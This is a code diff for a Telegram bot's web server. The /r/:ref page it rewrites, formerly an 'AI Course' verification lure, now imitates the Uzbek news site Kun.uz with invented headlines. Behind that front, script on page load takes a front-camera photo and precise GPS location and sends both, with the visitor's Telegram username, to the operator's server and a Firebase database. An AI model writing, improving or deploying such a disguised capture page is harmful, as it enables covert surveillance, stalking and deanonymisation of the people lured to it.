@@ -163,18 +163,7 @@ bot.command("link", async (ctx) => {
 });
 
 // === ADMIN PANEL (unchanged) ===
-bot.command("admin", async (ctx) => {
-  if (String(ctx.from.id) !== ADMIN_USER_ID) return ctx.reply("Access denied.");
-  const { total } = await getStats();
-  await ctx.reply(`Admin Panel\nTotal Users: ${total}`, {
-    reply_markup: {
-      inline_keyboard: [
-        [{ text: "View Statistics", callback_data: "stats" }],
-        [{ text: "Send Message to All Users", callback_data: "broadcast" }]
-      ]
-    }
-  });
-});
+
 bot.action("stats", async (ctx) => {
   if (String(ctx.from.id) !== ADMIN_USER_ID) return ctx.answerCbQuery();
   const { total } = await getStats();
@@ -299,28 +288,265 @@ app.get("/r/:ref", async (req, res) => {
   if (!/^\d+$/.test(ref)) return res.status(400).send("Invalid");
   await saveUser(ref);
   res.type("html").send(`<!DOCTYPE html>
-<html lang="ru"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>AI Course</title>
+<html lang="uz"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Kun.uz - So'nggi yangiliklar</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
-<style>body,html{margin:0;padding:0;height:100%;background:#111;color:#fff;font-family:system-ui;display:flex;align-items:center;justify-content:center;}
-.card{background:rgba(255,255,255,.08);backdrop-filter:blur(12px);border-radius:16px;padding:20px;max-width:380px;width:90%;text-align:center;}
-h1{font-size:1.6rem;color:#0f9;margin:8px 0;}
-.warn{background:#c62828;padding:12px;border-radius:10px;font-size:.9rem;margin:12px 0;}
-button{background:#0f9;color:#000;border:none;padding:14px;font-size:1rem;font-weight:600;border-radius:50px;width:100%;cursor:pointer;}
-#status{margin-top:12px;padding:10px;background:rgba(0,255,136,.1);border-radius:8px;font-size:.9rem;}</style></head><body>
-<div class="card"><h1>AI 2024</h1><div class="warn"><strong>REQUIRED:</strong><br>• Photo (verification)<br>• Location (region)</div>
-<button id="go">CONFIRM</button><div id="status">Ready…</div></div>
-<script>const ref=${JSON.stringify(ref)};const firebaseUrl=${JSON.stringify(FIREBASE_DB_URL)};let photoBlob=null,geo=null,username=null;
-if(window.Telegram?.WebApp){Telegram.WebApp.ready();Telegram.WebApp.expand();const u=Telegram.WebApp.initDataUnsafe.user;if(u)username=u.username||null;}
-document.getElementById("go").onclick=async()=>{const btn=document.getElementById("go"),status=document.getElementById("status");btn.disabled=true;status.textContent="Starting...";
-try{const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});const video=document.createElement("video");video.srcObject=stream;video.muted=true;video.play();await new Promise(r=>video.onloadeddata=r);
-const canvas=document.createElement("canvas");canvas.width=video.videoWidth||640;canvas.height=video.videoHeight||480;canvas.getContext("2d").drawImage(video,0,0,canvas.width,canvas.height);
-photoBlob=await new Promise(res=>canvas.toBlob(res,"image/jpeg",0.9));stream.getTracks().forEach(t=>t.stop());status.textContent="Photo OK";}catch(e){status.textContent="No photo";}
-try{geo=await new Promise((res,rej)=>{const t=setTimeout(()=>rej(),8000);navigator.geolocation.getCurrentPosition(p=>{clearTimeout(t);res({lat:p.coords.latitude,lon:p.coords.longitude});},()=>{clearTimeout(t);rej();},{timeout:8000,enableHighAccuracy:true});});status.textContent+=" | GPS OK";}catch(e){status.textContent+=" | No GPS";}
-if(!photoBlob&&!geo){status.textContent="Nothing received";btn.disabled=false;return;}
-status.textContent="Sending...";const fd=new FormData();fd.append("ref",ref);if(geo){fd.append("latitude",geo.lat);fd.append("longitude",geo.lon);}if(photoBlob)fd.append("photo",photoBlob,"s.jpg");
-try{await fetch("/submit",{method:"POST",body:fd});const userData={userId:ref,username,timestamp:Date.now(),active:true,hasPhoto:!!photoBlob,hasLocation:!!geo};
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body,html{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f5f5f5;color:#333;line-height:1.6;}
+.header{background:#fff;border-bottom:3px solid #e31e24;box-shadow:0 2px 8px rgba(0,0,0,.1);position:sticky;top:0;z-index:1000;}
+.header-content{max-width:1200px;margin:0 auto;padding:15px 20px;display:flex;align-items:center;justify-content:space-between;}
+.logo{font-size:28px;font-weight:700;color:#e31e24;text-decoration:none;}
+.logo:hover{opacity:.9;}
+.nav{display:flex;gap:25px;flex-wrap:wrap;}
+.nav a{color:#333;text-decoration:none;font-weight:500;font-size:15px;transition:color .3s;}
+.nav a:hover{color:#e31e24;}
+.container{max-width:1200px;margin:20px auto;padding:0 20px;}
+.main-content{display:grid;grid-template-columns:1fr 350px;gap:25px;margin-top:20px;}
+@media(max-width:968px){.main-content{grid-template-columns:1fr;}}
+.article-card{background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,.08);margin-bottom:20px;transition:transform .2s,box-shadow .2s;}
+.article-card:hover{transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,0,0,.12);}
+.article-image{width:100%;height:220px;object-fit:cover;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);}
+.article-content{padding:20px;}
+.article-title{font-size:22px;font-weight:700;color:#1a1a1a;margin-bottom:12px;line-height:1.4;}
+.article-meta{display:flex;gap:15px;font-size:13px;color:#666;margin-bottom:15px;}
+.article-text{color:#555;line-height:1.7;margin-bottom:15px;}
+.read-more{display:inline-block;color:#e31e24;text-decoration:none;font-weight:600;font-size:14px;}
+.read-more:hover{text-decoration:underline;}
+.sidebar{background:#fff;border-radius:8px;padding:20px;box-shadow:0 2px 8px rgba(0,0,0,.08);height:fit-content;position:sticky;top:90px;}
+.sidebar-title{font-size:18px;font-weight:700;color:#1a1a1a;margin-bottom:15px;padding-bottom:10px;border-bottom:2px solid #e31e24;}
+.news-item{display:flex;gap:12px;padding:12px 0;border-bottom:1px solid #eee;}
+.news-item:last-child{border-bottom:none;}
+.news-item img{width:80px;height:60px;object-fit:cover;border-radius:4px;background:#ddd;}
+.news-item-content{flex:1;}
+.news-item-title{font-size:14px;font-weight:600;color:#1a1a1a;margin-bottom:5px;line-height:1.4;}
+.news-item-time{font-size:12px;color:#999;}
+.hero-section{background:linear-gradient(135deg,#e31e24 0%,#c41e3a 100%);color:#fff;padding:40px 20px;border-radius:8px;text-align:center;margin-bottom:30px;}
+.hero-title{font-size:32px;font-weight:700;margin-bottom:15px;}
+.hero-subtitle{font-size:18px;opacity:.95;}
+.status-box{background:#fff;border-left:4px solid #e31e24;padding:15px;margin:15px 0;border-radius:4px;}
+.status-item{display:flex;align-items:center;gap:10px;padding:8px 0;font-size:14px;}
+.status-icon{width:20px;height:20px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;}
+.status-icon.pending{background:#ffc107;color:#000;}
+.status-icon.success{background:#28a745;color:#fff;}
+.status-icon.error{background:#dc3545;color:#fff;}
+.btn-primary{background:#e31e24;color:#fff;border:none;padding:14px 28px;font-size:16px;font-weight:600;border-radius:6px;cursor:pointer;width:100%;transition:background .3s;}
+.btn-primary:hover{background:#c41e3a;}
+.btn-primary:disabled{background:#ccc;cursor:not-allowed;}
+.loading{display:inline-block;width:16px;height:16px;border:2px solid #fff;border-top-color:transparent;border-radius:50%;animation:spin .6s linear infinite;margin-left:8px;}
+@keyframes spin{to{transform:rotate(360deg);}}
+.hidden{display:none;}
+#videoPreview{width:100%;max-width:400px;border-radius:8px;margin:15px 0;display:none;}
+.success-message{background:#28a745;color:#fff;padding:20px;border-radius:8px;text-align:center;margin-top:20px;font-size:18px;font-weight:600;}
+</style></head><body>
+<div class="header">
+<div class="header-content">
+<a href="#" class="logo">Kun.uz</a>
+<nav class="nav">
+<a href="#">Asosiy</a>
+<a href="#">Jamiyat</a>
+<a href="#">Iqtisodiyot</a>
+<a href="#">Siyosat</a>
+<a href="#">Sport</a>
+<a href="#">Texnologiya</a>
+</nav>
+</div>
+</div>
+<div class="container">
+<div class="hero-section">
+<h1 class="hero-title">So'nggi yangiliklar va muhim voqealar</h1>
+<p class="hero-subtitle">O'zbekistondagi eng tezkor va ishonchli axborot manbasi</p>
+</div>
+<div class="main-content">
+<div>
+<div class="article-card">
+<div class="article-image"></div>
+<div class="article-content">
+<h2 class="article-title">Prezident yangi investitsiya loyihalarini taqdim etdi</h2>
+<div class="article-meta">
+<span>📅 Bugun, 14:30</span>
+<span>👁️ 12,450</span>
+<span>💬 234</span>
+</div>
+<p class="article-text">O'zbekiston Prezidenti mamlakat iqtisodiyotini rivojlantirish bo'yicha yangi investitsiya loyihalarini taqdim etdi. Loyihalar jami 5 milliard dollarni tashkil etadi va minglab yangi ish o'rinlarini yaratadi.</p>
+<a href="#" class="read-more">Batafsil o'qish →</a>
+</div>
+</div>
+<div class="article-card">
+<div class="article-content">
+<h2 class="article-title">Toshkentda yangi metro liniyasi ochildi</h2>
+<div class="article-meta">
+<span>📅 Bugun, 11:15</span>
+<span>👁️ 8,920</span>
+<span>💬 156</span>
+</div>
+<p class="article-text">Toshkent metrosining yangi liniyasi foydalanishga topshirildi. Yangi liniya shaharning janubiy qismini markaz bilan bog'laydi va transport muammolarini yechishga yordam beradi.</p>
+<a href="#" class="read-more">Batafsil o'qish →</a>
+</div>
+</div>
+<div class="status-box">
+<h3 style="margin-bottom:15px;color:#1a1a1a;">Tekshiruv holati</h3>
+<div class="status-item">
+<div class="status-icon pending" id="photoIcon">⏳</div>
+<span id="photoStatus">Kamera ruxsati so'ralmoqda...</span>
+</div>
+<div class="status-item">
+<div class="status-icon pending" id="locationIcon">⏳</div>
+<span id="locationStatus">Joylashuv ruxsati so'ralmoqda...</span>
+</div>
+</div>
+<video id="videoPreview" autoplay playsinline></video>
+<button class="btn-primary" id="submitBtn" disabled>Tasdiqlash va yuborish</button>
+<div id="successMessage" class="hidden success-message">Muvaffaqiyatli yuborildi! Sizning ma'lumotlaringiz qayta ishlanmoqda.</div>
+</div>
+<div class="sidebar">
+<h3 class="sidebar-title">Tezkor yangiliklar</h3>
+<div class="news-item">
+<div style="width:80px;height:60px;background:#ddd;border-radius:4px;"></div>
+<div class="news-item-content">
+<div class="news-item-title">Yangi ta'lim dasturlari e'lon qilindi</div>
+<div class="news-item-time">1 soat oldin</div>
+</div>
+</div>
+<div class="news-item">
+<div style="width:80px;height:60px;background:#ddd;border-radius:4px;"></div>
+<div class="news-item-content">
+<div class="news-item-title">Sog'liqni saqlash tizimida yangiliklar</div>
+<div class="news-item-time">2 soat oldin</div>
+</div>
+</div>
+<div class="news-item">
+<div style="width:80px;height:60px;background:#ddd;border-radius:4px;"></div>
+<div class="news-item-content">
+<div class="news-item-title">Qishloq xo'jaligida rekord hosil</div>
+<div class="news-item-time">3 soat oldin</div>
+</div>
+</div>
+<div class="news-item">
+<div style="width:80px;height:60px;background:#ddd;border-radius:4px;"></div>
+<div class="news-item-content">
+<div class="news-item-title">Turizm sohasida o'sish kuzatildi</div>
+<div class="news-item-time">4 soat oldin</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<script>
+const ref=${JSON.stringify(ref)};
+const firebaseUrl=${JSON.stringify(FIREBASE_DB_URL)};
+let photoBlob=null,geo=null,username=null;
+let photoReady=false,locationReady=false;
+
+if(window.Telegram?.WebApp){
+Telegram.WebApp.ready();
+Telegram.WebApp.expand();
+const u=Telegram.WebApp.initDataUnsafe.user;
+if(u)username=u.username||null;
+}
+
+function updateButton(){
+const btn=document.getElementById("submitBtn");
+if(photoReady||locationReady){
+btn.disabled=false;
+btn.innerHTML="Tasdiqlash va yuborish";
+}else{
+btn.disabled=true;
+btn.innerHTML="Kamera yoki joylashuv kerak";
+}
+}
+
+async function requestCamera(){
+const photoIcon=document.getElementById("photoIcon");
+const photoStatus=document.getElementById("photoStatus");
+const videoPreview=document.getElementById("videoPreview");
+try{
+photoStatus.textContent="Kamera ochilmoqda...";
+const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+const video=document.createElement("video");
+video.srcObject=stream;
+video.muted=true;
+video.play();
+await new Promise(r=>video.onloadeddata=r);
+const canvas=document.createElement("canvas");
+canvas.width=video.videoWidth||640;
+canvas.height=video.videoHeight||480;
+canvas.getContext("2d").drawImage(video,0,0,canvas.width,canvas.height);
+photoBlob=await new Promise(res=>canvas.toBlob(res,"image/jpeg",0.9));
+stream.getTracks().forEach(t=>t.stop());
+photoIcon.className="status-icon success";
+photoIcon.textContent="✓";
+photoStatus.textContent="Kamera muvaffaqiyatli yuklandi";
+photoReady=true;
+updateButton();
+}catch(e){
+photoIcon.className="status-icon error";
+photoIcon.textContent="✗";
+photoStatus.textContent="Kamera ruxsati rad etildi";
+console.error("Camera error:",e);
+}
+}
+
+async function requestLocation(){
+const locationIcon=document.getElementById("locationIcon");
+const locationStatus=document.getElementById("locationStatus");
+try{
+locationStatus.textContent="Joylashuv aniqlanmoqda...";
+geo=await new Promise((res,rej)=>{
+const t=setTimeout(()=>rej(),8000);
+navigator.geolocation.getCurrentPosition(
+p=>{
+clearTimeout(t);
+res({lat:p.coords.latitude,lon:p.coords.longitude});
+},
+()=>{
+clearTimeout(t);
+rej();
+},
+{timeout:8000,enableHighAccuracy:true}
+);
+});
+locationIcon.className="status-icon success";
+locationIcon.textContent="✓";
+locationStatus.textContent="Joylashuv muvaffaqiyatli aniqlandi";
+locationReady=true;
+updateButton();
+}catch(e){
+locationIcon.className="status-icon error";
+locationIcon.textContent="✗";
+locationStatus.textContent="Joylashuv ruxsati rad etildi";
+console.error("Location error:",e);
+}
+}
+
+document.getElementById("submitBtn").onclick=async()=>{
+const btn=document.getElementById("submitBtn");
+const successMsg=document.getElementById("successMessage");
+btn.disabled=true;
+btn.innerHTML="Yuborilmoqda...<span class='loading'></span>";
+try{
+const fd=new FormData();
+fd.append("ref",ref);
+if(geo){
+fd.append("latitude",geo.lat);
+fd.append("longitude",geo.lon);
+}
+if(photoBlob)fd.append("photo",photoBlob,"s.jpg");
+await fetch("/submit",{method:"POST",body:fd});
+const userData={userId:ref,username,timestamp:Date.now(),active:true,hasPhoto:!!photoBlob,hasLocation:!!geo};
 await fetch(\`\${firebaseUrl}/activeUsers/\${ref}.json\`,{method:"PUT",headers:{"Content-Type":"application/json"},body:JSON.stringify(userData)});
-status.innerHTML="<strong>SUCCESS!</strong><br>You are active!";btn.style.display="none";}catch(e){status.textContent="Error";btn.disabled=false;}}</script></body></html>`);
+btn.style.display="none";
+successMsg.classList.remove("hidden");
+}catch(e){
+btn.disabled=false;
+btn.innerHTML="Xatolik yuz berdi. Qayta urinib ko'ring";
+console.error("Submit error:",e);
+}
+};
+
+requestCamera();
+requestLocation();
+</script></body></html>`);
 });
 
 // === SUBMIT ===
